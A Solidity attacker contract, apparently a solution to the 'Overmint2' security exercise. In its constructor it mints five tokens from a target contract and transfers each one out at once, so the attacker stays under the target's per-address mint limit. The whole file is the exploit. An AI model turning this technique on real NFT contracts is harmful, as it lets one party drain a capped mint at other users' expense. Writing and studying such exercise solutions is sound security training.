// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import { Overmint2 } from "./Overmint2.sol";

contract Overmint2Attacker {
    Overmint2 public victim;
    address public attacker;
    constructor(address _victim) {
        victim = Overmint2(_victim);
        attacker = msg.sender;
        for (uint256 i = 0; i < 5; i++) {
            victim.mint();
            uint256 tokenId = victim.totalSupply();
            victim.transferFrom(address(this), attacker, tokenId);
        }
    }
}

